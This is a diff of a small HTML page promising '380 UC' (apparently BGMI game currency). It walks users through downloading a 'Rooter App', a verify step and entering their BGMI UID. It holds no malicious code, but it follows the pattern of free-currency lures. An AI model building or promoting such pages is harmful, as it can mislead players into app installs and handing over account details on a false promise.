@@ -2,29 +2,36 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Get 380 UC</title>
-  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
-  <h1 id="main-title">Get 380 UC Now</h1>
+  <div class="container">
+    <h1 class="main-heading">Get <span class="highlight">380 UC Now</span></h1>
+    
+    <div class="step">
+      <h2>Step 1: Download Rooter App</h2>
+      <button id="downloadBtn">Download Now</button>
+    </div>
 
-  <div class="step" id="step1">
-    <button id="downloadBtn">Download Now</button>
-  </div>
+    <div class="step">
+      <h2>Step 2: Verify Process</h2>
+      <button id="verifyBtn">Verify Now</button>
+    </div>
 
-  <div class="step" id="step2">
-    <button id="verifyBtn">Verify Now</button>
-  </div>
-
-  <div class="step" id="step3">
-    <input type="text" id="uidInput" placeholder="Enter your BGMI ID" />
-    <button id="submitBtn">Submit</button>
+    <div class="step">
+      <h2>Step 3: Enter Your BGMI UID</h2>
+      <input type="number" id="uidInput" placeholder="Enter BGMI UID"/>
+      <button id="submitBtn">Submit</button>
+    </div>
   </div>
 
   <div id="popup" class="popup">
-    <p id="popupMessage"></p>
-    <button onclick="closePopup()">OK</button>
+    <div class="popup-content">
+      <p id="popupText">Popup Text</p>
+      <button id="popupOk">OK</button>
+    </div>
   </div>
 
   <script src="script.js"></script>
